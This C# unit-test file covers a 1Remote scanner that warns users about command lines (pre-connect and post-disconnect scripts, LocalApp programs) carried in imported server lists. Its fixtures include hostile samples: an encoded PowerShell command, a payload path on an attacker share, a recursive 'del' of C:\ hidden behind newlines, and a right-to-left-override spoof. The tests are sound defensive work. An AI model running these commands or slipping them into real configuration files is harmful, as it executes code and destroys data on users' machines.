using System;
using System.Collections.Generic;
using System.Linq;
using _1RM.Utils.Import;
using Microsoft.VisualStudio.TestTools.UnitTesting;

namespace Tests.Utils.Import
{
    /// <summary>
    /// What a server list brings with it besides addresses.
    ///
    /// Three fields of a server entry are command lines this app runs on the *importing* machine, with the
    /// importing user's account: the before-connect script, the after-disconnect script, and a LocalApp
    /// entry's program. All three are serialised into the JSON export, the PRemoteM/1Remote database and
    /// the backup archive, and every importer inserted them without showing them — so a file titled "our
    /// server list" was a way to have a command run on someone's desktop the next time they opened the
    /// entry, which is the reason they imported it.
    ///
    /// These are string and list cases: no file system, no paths, no permissions, so Windows and Linux
    /// agree on all of them.
    /// </summary>
    [TestClass]
    public class ImportedCommandScanTests
    {
        [TestInitialize]
        public void Setup()
        {
            TestInit.Init();
        }

        private static string Kind(EImportedCommandKind kind) => kind switch
        {
            EImportedCommandKind.BeforeConnect => "before",
            EImportedCommandKind.AfterDisconnect => "after",
            _ => "app",
        };

        private static string More(int n) => $"+{n} more";

        [TestMethod]
        public void AnOrdinaryServerListRaisesNothing()
        {
            var found = ImportedCommandScan.Scan(new[]
            {
                new ImportedCommandSource("web-01"),
                new ImportedCommandSource("db-02"),
            });

            Assert.AreEqual(0, found.Count);
            Assert.AreEqual("", ImportedCommandScan.Describe(found));
            Assert.AreEqual(0, ImportedCommandScan.ServerCount(found));
        }

        [TestMethod]
        public void NoInputAtAllIsNotACrash()
        {
            Assert.AreEqual(0, ImportedCommandScan.Scan(null).Count);
            Assert.AreEqual(0, ImportedCommandScan.Scan(Array.Empty<ImportedCommandSource>()).Count);
            Assert.AreEqual("", ImportedCommandScan.Describe(null));
            Assert.AreEqual(0, ImportedCommandScan.ServerCount(null));
        }

        [TestMethod]
        public void ABeforeConnectScriptIsReported()
        {
            var found = ImportedCommandScan.Scan(new[]
            {
                new ImportedCommandSource("web-01", commandBeforeConnected: "powershell -enc SQBFAFgA"),
            });

            Assert.AreEqual(1, found.Count);
            Assert.AreEqual(EImportedCommandKind.BeforeConnect, found[0].Kind);
            Assert.AreEqual("web-01", found[0].ServerName);
            Assert.AreEqual("powershell -enc SQBFAFgA", found[0].CommandLine);
        }

        [TestMethod]
        public void AnAfterDisconnectScriptIsReported()
        {
            var found = ImportedCommandScan.Scan(new[]
            {
                new ImportedCommandSource("web-01", commandAfterDisconnected: @"C:\tmp\cleanup.bat"),
            });

            Assert.AreEqual(1, found.Count);
            Assert.AreEqual(EImportedCommandKind.AfterDisconnect, found[0].Kind);
        }

        /// <summary>
        /// A LocalApp entry is a program with a server's icon on it. Nothing in the list view says that
        /// double-clicking it starts an executable rather than opening a session.
        /// </summary>
        [TestMethod]
        public void ALocalAppEntryIsReportedForItsProgram()
        {
            var found = ImportedCommandScan.Scan(new[]
            {
                new ImportedCommandSource("Notes", localAppPath: @"\\evil.example.com\share\payload.exe"),
            });

            Assert.AreEqual(1, found.Count);
            Assert.AreEqual(EImportedCommandKind.LocalApp, found[0].Kind);
            Assert.AreEqual(@"\\evil.example.com\share\payload.exe", found[0].CommandLine);
        }

        [TestMethod]
        public void OneEntryCanCarryAllThree()
        {
            var found = ImportedCommandScan.Scan(new[]
            {
                new ImportedCommandSource("all", "a.bat", "b.bat", "c.exe"),
            });

            CollectionAssert.AreEqual(
                new[] { EImportedCommandKind.BeforeConnect, EImportedCommandKind.AfterDisconnect, EImportedCommandKind.LocalApp },
                found.Select(x => x.Kind).ToArray());
            Assert.AreEqual(1, ImportedCommandScan.ServerCount(found), "it is still one entry to decide about");
        }

        /// <summary>
        /// <c>RunScriptBeforeConnect</c> itself treats whitespace as no script, so an entry whose field
        /// holds a stray space must not produce a warning with an empty line in it.
        /// </summary>
        [TestMethod]
        public void AFieldWithNothingButSpaceIsNotACommand()
        {
            var found = ImportedCommandScan.Scan(new[]
            {
                new ImportedCommandSource("web-01", "   ", "", null),
            });

            Assert.AreEqual(0, found.Count);
        }

        /// <summary>
        /// The count in the message is entries, not command lines, and a file is free to give two servers
        /// the same name — three findings under one name would otherwise read as one server.
        /// </summary>
        [TestMethod]
        public void TwoEntriesWithTheSameNameStillCountAsTwo()
        {
            var found = ImportedCommandScan.Scan(new[]
            {
                new ImportedCommandSource("prod", commandBeforeConnected: "one.bat"),
                new ImportedCommandSource("prod", commandBeforeConnected: "two.bat"),
            });

            Assert.AreEqual(2, found.Count);
            Assert.AreEqual(2, ImportedCommandScan.ServerCount(found));
        }

        [TestMethod]
        public void ANullEntryInTheListIsSkippedWithoutShiftingTheOthers()
        {
            var found = ImportedCommandScan.Scan(new ImportedCommandSource?[]
            {
                null,
                new ImportedCommandSource("web-01", commandBeforeConnected: "a.bat"),
            }!);

            Assert.AreEqual(1, found.Count);
            Assert.AreEqual(1, found[0].EntryIndex, "the surviving entry is still the second one");
        }

        /// <summary>
        /// A newline in a command line would let one entry push the rest of the list — and the question
        /// itself — out of a message box, and a right-to-left override would let the command be drawn as
        /// something other than what runs. Both are spelled out instead of obeyed, the way the file
        /// browser already does for remote names.
        /// </summary>
        [TestMethod]
        public void ACommandCannotUseNewlinesToPushTheQuestionOffTheDialog()
        {
            var found = ImportedCommandScan.Scan(new[]
            {
                new ImportedCommandSource("web-01", commandBeforeConnected: "del /q /s C:\\*\n\n\n\nnothing to see"),
            });

            Assert.AreEqual(1, found.Count);
            StringAssert.Contains(found[0].CommandLine, "<U+000A>");
            Assert.IsFalse(found[0].CommandLine.Contains('\n'));
        }

        [TestMethod]
        public void ACommandCannotBeDrawnAsSomethingOtherThanItself()
        {
            var found = ImportedCommandScan.Scan(new[]
            {
                new ImportedCommandSource("web-01", commandBeforeConnected: "echo hi\u202E exe.eldnah"),
            });

            StringAssert.Contains(found[0].CommandLine, "<U+202E>");
        }

        [TestMethod]
        public void AServerNameIsCleanedTheSameWay()
        {
            var found = ImportedCommandScan.Scan(new[]
            {
                new ImportedCommandSource("web\u202E01", commandBeforeConnected: "a.bat"),
            });

            StringAssert.Contains(found[0].ServerName, "<U+202E>");
        }

        [TestMethod]
        public void AnEntryWithNoNameIsStillNamedSomething()
        {
            var found = ImportedCommandScan.Scan(new[]
            {
                new ImportedCommandSource("   ", commandBeforeConnected: "a.bat"),
            });

            Assert.AreEqual("?", found[0].ServerName);
        }

        /// <summary>
        /// A very long command line must not be able to fill the dialog on its own. The head is kept —
        /// unlike a path, the program being run is at the front and that is what the answer turns on.
        /// </summary>
        [TestMethod]
        public void AVeryLongCommandIsCutFromTheEnd()
        {
            var command = "powershell.exe " + new string('x', 500);
            var found = ImportedCommandScan.Scan(new[]
            {
                new ImportedCommandSource("web-01", commandBeforeConnected: command),
            });

            Assert.AreEqual(ImportedCommandScan.MaxCommandLength, found[0].CommandLine.Length);
            StringAssert.StartsWith(found[0].CommandLine, "powershell.exe ");
            StringAssert.EndsWith(found[0].CommandLine, "...");
        }

        [TestMethod]
        public void AVeryLongServerNameIsCutToo()
        {
            var found = ImportedCommandScan.Scan(new[]
            {
                new ImportedCommandSource(new string('n', 300), commandBeforeConnected: "a.bat"),
            });

            Assert.AreEqual(40, found[0].ServerName.Length);
        }

        [TestMethod]
        public void TheDescriptionNamesTheServerTheFieldAndTheCommand()
        {
            var found = ImportedCommandScan.Scan(new[]
            {
                new ImportedCommandSource("web-01", commandBeforeConnected: "a.bat"),
            });

            var text = ImportedCommandScan.Describe(found, describeKind: Kind, describeOmitted: More);

            Assert.AreEqual("• web-01 [before]  a.bat", text);
        }

        [TestMethod]
        public void ADescriptionAtTheLimitDoesNotClaimThereAreMore()
        {
            var found = ImportedCommandScan.Scan(new[]
            {
                new ImportedCommandSource("a", commandBeforeConnected: "1.bat"),
                new ImportedCommandSource("b", commandBeforeConnected: "2.bat"),
            });

            var text = ImportedCommandScan.Describe(found, 2, Kind, More);

            Assert.IsFalse(text.Contains("more"), text);
            Assert.AreEqual(2, text.Split(Environment.NewLine, StringSplitOptions.None).Length);
        }

        /// <summary>
        /// A file with a hundred scripted entries must not produce a hundred-line message box. The count
        /// is the part that decides the answer.
        /// </summary>
        [TestMethod]
        public void ALongListIsCutDownAndTheRestAreCounted()
        {
            var sources = Enumerable.Range(0, 40)
                .Select(i => new ImportedCommandSource("srv-" + i, commandBeforeConnected: "x.bat"))
                .ToList();

            var found = ImportedCommandScan.Scan(sources);
            var text = ImportedCommandScan.Describe(found, 5, Kind, More);
            var lines = text.Split(Environment.NewLine, StringSplitOptions.None);

            Assert.AreEqual(40, found.Count);
            Assert.AreEqual(40, ImportedCommandScan.ServerCount(found));
            Assert.AreEqual(6, lines.Length, "five commands and one tally");
            Assert.AreEqual("+35 more", lines[5]);
        }

        [TestMethod]
        public void ALimitBelowOneIsReadAsOne()
        {
            var found = ImportedCommandScan.Scan(new[]
            {
                new ImportedCommandSource("a", commandBeforeConnected: "1.bat"),
                new ImportedCommandSource("b", commandBeforeConnected: "2.bat"),
            });

            var lines = ImportedCommandScan.Describe(found, 0, Kind, More).Split(Environment.NewLine, StringSplitOptions.None);

            Assert.AreEqual(2, lines.Length);
            Assert.AreEqual("+1 more", lines[1]);
        }

        /// <summary>
        /// The two label callbacks are the caller's, because this class is deliberately free of the
        /// translation service. Without them the text still has to be readable rather than empty.
        /// </summary>
        [TestMethod]
        public void WithoutLabelCallbacksTheTextStillSaysWhatItFound()
        {
            var found = ImportedCommandScan.Scan(new[]
            {
                new ImportedCommandSource("a", commandBeforeConnected: "1.bat"),
                new ImportedCommandSource("b", commandBeforeConnected: "2.bat"),
            });

            var text = ImportedCommandScan.Describe(found, 1);

            StringAssert.Contains(text, "BeforeConnect");
            StringAssert.Contains(text, "(+1)");
        }
    }
}
